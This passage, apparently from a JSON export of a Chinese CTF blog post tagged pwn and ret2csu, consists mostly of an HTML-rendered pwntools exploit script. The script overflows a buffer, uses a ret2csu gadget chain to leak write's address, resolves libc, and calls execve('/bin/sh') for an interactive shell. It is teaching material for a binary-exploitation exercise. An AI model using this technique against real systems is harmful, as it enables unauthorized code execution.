punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>bss_base<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>csu1<span class=\"token operator\">=</span><span class=\"token number\">0x000400606</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>csu2<span class=\"token operator\">=</span><span class=\"token number\">0x0004005F0</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">csu</span><span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">,</span>rbp<span class=\"token punctuation\">,</span>r12<span class=\"token punctuation\">,</span>r13<span class=\"token punctuation\">,</span>r14<span class=\"token punctuation\">,</span>r15<span class=\"token punctuation\">,</span>last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    payload<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">136</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>csu1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbp<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r12<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r13<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r14<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r15<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>csu2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#加 8 个 a 是因为 csu1 里先执行 add rsp，8   ，意味着将栈变长了八字节，要填充才能到后面</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    payload<span class=\"token operator\">+=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">56</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>last<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token comment\">#56 是将 add rsp，8 以及之后的总共 7 行全覆盖掉 7*8，前面已经给 rdx,rsi,edi 赋值了，再改变也没有影响</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre> </pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>    <span class=\"token comment\">#不能用 sendline，会出错</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre> </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre> </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>csu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>write<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>write<span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>main<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre> </pre></td></tr><tr><td data-num=\"29\"></td><td><pre>write_really<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre> </pre></td></tr><tr><td data-num=\"31\"></td><td><pre>libc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">,</span>write_really<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>libc_base<span class=\"token operator\">=</span>write_really<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>execve<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'execve'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre> </pre></td></tr><tr><td data-num=\"35\"></td><td><pre> </pre></td></tr><tr><td data-num=\"36\"></td><td><pre> </pre></td></tr><tr><td data-num=\"37\"></td><td><pre>csu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>read<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>bss_base<span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span>main<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>execve<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre> </pre></td></tr><tr><td data-num=\"41\"></td><td><pre>csu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>bss_base<span class=\"token punctuation\">,</span>bss_base<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>main<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">#bss_base 相当于是 execve 的地址，bss_base+8 是到了 execve 的参数 \"/bin/sh\\x00\"</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre> </pre></td></tr><tr><td data-num=\"44\"></td><td><pre> </pre></td></tr><tr><td data-num=\"45\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://img-blog.csdnimg.cn/c98c4ed447994c66ac1d2bfc64b9f3c0.png\" alt=\"\" /></p>\n<p>参考链接 ret2csu：<span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9ESXFZdg==\">http://t.csdn.cn/DIqYv</span></p>\n",
            "tags": [
                "pwn",
                "ret2csu",
                "ctf"
            ]
        }
    ]
}